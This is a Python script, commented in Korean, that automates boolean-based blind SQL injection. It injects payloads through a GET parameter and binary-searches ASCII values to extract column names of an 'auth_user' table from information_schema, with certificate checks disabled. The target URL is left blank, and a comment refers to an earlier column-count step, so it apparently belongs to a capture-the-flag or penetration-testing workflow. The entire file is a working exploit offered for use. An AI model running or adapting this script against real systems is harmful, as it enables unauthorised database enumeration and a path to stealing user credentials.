import requests

URL = ""
PARAM = "s"
TRUE_INDICATOR = ""

def send_payload(payload):
    r = requests.get(URL, params={PARAM: payload}, verify=False)
    return r.text

def is_true(payload):
    return TRUE_INDICATOR in send_payload(payload)

def get_column_name(table_name, index=0, max_len=30):
    """특정 테이블의 index번째 컬럼 이름 추출"""
    col_name = ""
    for i in range(1, max_len+1):
        low, high = 32, 126
        ascii_val = None
        while low <= high:
            mid = (low + high) // 2
            payload = (
                f"x' OR ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
                f"WHERE table_name='{table_name}' LIMIT {index},1),{i},1))>{mid}-- -"
            )
            if is_true(payload):
                low = mid + 1
            else:
                payload = (
                    f"x' OR ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
                    f"WHERE table_name='{table_name}' LIMIT {index},1),{i},1))={mid}-- -"
                )
                if is_true(payload):
                    ascii_val = mid
                    break
                high = mid - 1
        if ascii_val:
            col_name += chr(ascii_val)
        else:
            break
    return col_name

if __name__ == "__main__":
    table_name = "auth_user"
    col_count = 11  # 이전 단계(get_column_count)에서 구한 값 입력

    print(f"[*] Extracting {col_count} columns from {table_name} ...")
    columns = []
    for idx in range(col_count):
        cname = get_column_name(table_name, index=idx)
        if cname:
            columns.append(cname)
            print(f"[{idx+1}/{col_count}] {cname}")
        else:
            break

    print("\n=== 최종 컬럼 목록 ===")
    for i, c in enumerate(columns, start=1):
        print(f"{i}. {c}")
